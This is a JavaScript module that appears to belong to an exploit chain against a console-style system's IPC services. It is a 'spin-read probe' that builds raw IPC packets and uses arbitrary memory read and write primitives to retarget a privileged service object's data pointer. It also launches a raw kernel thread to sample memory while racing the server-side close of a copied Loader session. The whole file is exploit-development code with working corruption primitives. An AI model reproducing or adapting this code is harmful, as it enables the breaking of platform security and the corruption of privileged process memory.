// kaiHEN port — spin-read probe (SR). The copied Loader-root session is
// closed server-side at creation (0xF601 from every thread/transport/
// sequencing permutation). This probe watches the kill happen: a raw kernel
// thread drives the two-bucket read path directly — per round, two storage
// Writes retarget the data pointer (refcount field, then the borrowed entry
// pointer) and two storage Reads sample 8 bytes into private buffers — all
// pre-built packets sent through the frame SEND op on the candidate session.
// Meanwhile the loader thread issues a SECOND borrow-copy (it never touches
// the endpoint, so there is no pointer race). Decoding the sample timeline
// shows the value transitions with sample indices; the first field that
// moves outside our own writes names the close's mechanism class.

import runtime from "../core/runtime.mjs";
import {check, khLog, hex, readU64LE, readU32LE, arenaAlloc, arenaSlots,
    track, readNative} from "./state.mjs";
import {readFs, writeFs} from "./endpoint.mjs";
import {cmifSend, bareSendTransport, buildCmif} from "./wire.mjs";
import {u64Bytes} from "./state.mjs";

function buildCmifProbe(context, pkt, info, title) {
    // OpenCodeFileSystem on the copied root: the real first-use command.
    // info (arena) is page-aligned — WithUserBuffer requires it.
    buildCmif(pkt, {cmd: 0,
        input: [1, 3, 0, 0, 0, 0, 0, 0].concat(u64Bytes(BigInt(title))),
        b: [{addr: info, size: 0x1a4}]});
}

const ROUNDS = 60;   // 60 rounds x (ref, entry) = 120 samples. Frame size
// grows ~0x240/call (tables 0x100 + stack 0x140 per call); 240 calls keep
// the frame allocation under 180 KB — 800 calls asked malloc for 924 KB and
// died (frame=0 memset, run44).

function buildReadPkt(pkt, bufAddr, dataOffset) {
    runtime.prepPacket(pkt, (4 | (1 << 24)) >>> 0, 0x0C, []);
    runtime.write32(pkt + 8n, 8n);
    runtime.write32(pkt + 12n, BigInt(Number(bufAddr & 0xFFFFFFFFn)));
    runtime.write32(pkt + 16n, BigInt((1 |
        (Number((bufAddr >> 36n) & 7n) << 2) |
        (Number((bufAddr >> 32n) & 15n) << 28)) >>> 0));
    runtime.write32(pkt + 0x20n, 0x49434653n);
    runtime.write32(pkt + 0x28n, 0n);                       // cmd 0 = Read
    runtime.write64(pkt + 0x30n, BigInt(dataOffset));
    runtime.write64(pkt + 0x38n, 8n);
}

function buildWritePkt(pkt, srcAddr, pointerOffset) {
    runtime.prepPacket(pkt, (4 | (1 << 20)) >>> 0, 0x0C, []);
    const flags = 1n | ((srcAddr >> 36n) << 2n) |
        (((srcAddr >> 32n) & 0xFn) << 28n);
    runtime.write32(pkt + 8n, 8n);
    runtime.write32(pkt + 12n, BigInt(Number(srcAddr & 0xFFFFFFFFn)));
    runtime.write32(pkt + 16n, flags & 0xFFFFFFFFn);
    runtime.write32(pkt + 0x20n, 0x49434653n);
    runtime.write32(pkt + 0x28n, 1n);                       // cmd 1 = Write
    runtime.write64(pkt + 0x30n, BigInt(pointerOffset));
    runtime.write64(pkt + 0x38n, 8n);
}

export async function spinReadProbe(context, title) {
    const owned = context.inspectionDomain;
    const target = context.loaderRoot;
    const ep = context.ep;
    check(owned && target && context.loaderCopy && ep && ep.armed,
        "spin-read requires the loader-copy state and an armed endpoint");

    const refField = target.object + 0x38;
    const entry20 = context.loaderCopy.ownEntry + 0x20;
    const cand = context.candidateHandle;

    // Address carrier buffers for the pointer writes.
    const srcRef = arenaAlloc(context, 0x10, "sr-src-ref");
    const srcEnt = arenaAlloc(context, 0x10, "sr-src-ent");
    runtime.write64(srcRef, BigInt(refField));
    runtime.write64(srcEnt, BigInt(entry20));

    // Slab allocations (the arena has an entry-count cap ~400; per-packet
    // arenaAlloc calls exhaust it around round 59 regardless of size).
    // arenaAlloc returns BigInt addresses; keep all slab math BigInt.
    // Packet stride MUST be 0x1000 and the SEND size 0x1000n: the SDK
    // dispatcher (sdk+0x14ba90) relays a full 4KB message frame through
    // TLS — run45's 0x100 packets/sizes made every spinner send fail
    // (all-zero samples) while the same packets at 0x1000 worked in run39
    // and in every wave SEND (orchestration.js).
    const PKT_STRIDE = 0x1000n, BUF_STRIDE = 0x40n;
    const pktSlab = arenaAlloc(context, ROUNDS * 4 * 0x1000, "sr-pkts");
    const bufSlab = arenaAlloc(context, ROUNDS * 2 * 0x40, "sr-bufs");

    const packets = [];   // {pkt, readBuf?}
    for (let r = 0; r < ROUNDS; r++) {
        const base = pktSlab + BigInt(r) * 4n * PKT_STRIDE;
        const bufs = bufSlab + BigInt(r) * 2n * BUF_STRIDE;
        const wpktR = base, rpktR = base + PKT_STRIDE;
        const bufR = bufs;
        const wpktE = base + 2n * PKT_STRIDE, rpktE = base + 3n * PKT_STRIDE;
        const bufE = bufs + BUF_STRIDE;
        buildWritePkt(wpktR, srcRef, ep.dataEntryOffset + 0x20);
        buildReadPkt(rpktR, bufR, ep.dataOffset);
        buildWritePkt(wpktE, srcEnt, ep.dataEntryOffset + 0x20);
        buildReadPkt(rpktE, bufE, ep.dataOffset);
        packets.push({wpktR, rpktR, bufR, wpktE, rpktE, bufE});
    }
    const bufs = [];
    const calls = [];
    for (const p of packets) {
        calls.push({fn: runtime.IPC_SEND_DISPATCHER,
            args: [BigInt(cand), BigInt(p.wpktR), 0x1000n, 0n]});
        calls.push({fn: runtime.IPC_SEND_DISPATCHER,
            args: [BigInt(cand), BigInt(p.rpktR), 0x1000n, 0n]});
        bufs.push({field: "ref", buf: p.bufR});
        calls.push({fn: runtime.IPC_SEND_DISPATCHER,
            args: [BigInt(cand), BigInt(p.wpktE), 0x1000n, 0n]});
        calls.push({fn: runtime.IPC_SEND_DISPATCHER,
            args: [BigInt(cand), BigInt(p.rpktE), 0x1000n, 0n]});
        bufs.push({field: "entry20", buf: p.bufE});
    }
    const frame = runtime.buildRawFrame(calls);
    const scheduling = runtime.borrowThreadScheduling();
    check(scheduling, "spin scheduling borrow failed");

    // The second borrow-copy, with the spinner racing the command only.
    const oldPair = await readFs(context, entry20, 0x10);
    const borrowPair = await readFs(context, target.entry + 0x20, 0x10);
    const refBefore = await readFs(context, refField, 8)
        .then(b => readU32LE(b, 0));
    await khLog("SR0 spin " + ROUNDS + " rounds ref=" + hex(refBefore) +
        " entry20=" + hex(Number(readU64LE(oldPair, 0))));
    await writeFs(context, entry20, borrowPair);
    ep.pointer = null;   // the spinner now owns the data pointer
    const worker = runtime.launchRawWorker(BigInt(frame.frame), scheduling);
    check(worker.rc === 0 && worker.handle,
        "spin worker create failed: " + hex(worker.rc));
    track(context, worker.handle, "sr-worker");

    let copyHandle = 0;
    try {
        const slots = arenaSlots(context);
        const reply = cmifSend(owned.handle, {pkt: slots.pkt,
            control: true, cmd: 1,
            input: [owned.root & 0xff, owned.root >> 8 & 0xff,
                owned.root >> 16 & 0xff, owned.root >> 24 & 0xff],
            rawWords: 9});
        if (reply.transport === 0 && reply.moves && reply.moves.length)
            copyHandle = track(context, reply.moves[0], "sr-copy");
        await khLog("SR1 copy transport=" + hex(reply.transport) +
            " moves=" + (reply.moves ? reply.moves.length : 0) +
            " handle=" + hex(copyHandle));
        // First send on the fresh copy, INSIDE the spin window: if the
        // object ref drops at this moment rather than before it, the close
        // is triggered by the first dispatch, not at session creation.
        if (copyHandle) {
            const info = arenaAlloc(context, 0x2000, "sr-info");
            buildCmifProbe(context, slots.pkt2, info, title);
            const firstRc = bareSendTransport(copyHandle, slots.pkt2);
            await khLog("SR1b FIRST-SEND rc=" + hex(firstRc) +
                " handle=" + hex(copyHandle));
            const secondRc = bareSendTransport(copyHandle, slots.pkt2);
            await khLog("SR1c SECOND-SEND rc=" + hex(secondRc));
        }
    } finally {
        const waitRc = runtime.waitRawThread(worker.handle, 8000000000n);
        await khLog("SR2 wait=" + hex(waitRc));
        ep.pointer = null;
        await writeFs(context, entry20, oldPair);
    }

    // Post-send timeline: the first dispatch returned 0xF601 but the object
    // ref was still 2 at the last spinner sample. If the server-side close
    // is asynchronous, the release lands somewhere in this trail — a JS
    // read every ~8-11ms traces the drop (run46: SD2 read ref=2, then TS's
    // 0xF601 send, then SR0 read ref=1 ~380ms later — the drop happened in
    // that gap; this trail pins it for copy #2).
    let refNow = await readFs(context, refField, 8).then(b => readU32LE(b, 0));
    const refTrail = ["0:" + hex(refNow)];
    for (let i = 1; i <= 40; i++) {
        await runtime.waitMs(8);
        const v = await readFs(context, refField, 8).then(b => readU32LE(b, 0));
        if (v !== refNow) {
            refTrail.push("+" + i + ":" + hex(refNow) + ">" + hex(v));
            refNow = v;
        }
    }
    refTrail.push("end:" + hex(refNow));
    await khLog("SR4 post-send ref trail [" + refTrail.join(" ") + "]");

    // Decode the timeline: per-field value transitions with sample indices.
    const names = {ref: "ref(entry+0x38)", entry20: "entry20(+0x20)"};
    const last = {};
    const transitions = {ref: [], entry20: []};
    const failed = {ref: 0, entry20: 0};
    for (let s = 0; s < bufs.length; s++) {
        const {field, buf} = bufs[s];
        // The read's reply is not parsed here; the B-buffer holds the sample
        // only if the send transported 0 — indicated by the packet reply
        // result word (SFCO at +0x18 of the reply in the packet buffer).
        const value = readU64LE(readNative(buf, 8), 0);
        if (!(last[field] === undefined)) {
            if (value !== last[field])
                transitions[field].push({s, from: last[field], to: value});
        }
        last[field] = value;
    }
    for (const field of ["ref", "entry20"]) {
        const compact = transitions[field].slice(0, 10).map(t =>
            "#" + t.s + ":" + hex(Number(t.from & 0xffffffffffn)) + ">" +
            hex(Number(t.to & 0xffffffffffn))).join(" ");
        await khLog("SR3 " + names[field] + " final=" +
            hex(Number(last[field] & 0xffffffffffn)) +
            " transitions=" + transitions[field].length +
            (compact ? " " + compact : ""));
    }
    try { runtime.closeHandle(worker.handle); } catch (error) { /* exited */ }
    if (copyHandle) try { runtime.closeHandle(copyHandle); }
    catch (error) { /* dead */ }
    return {ok: true};
}
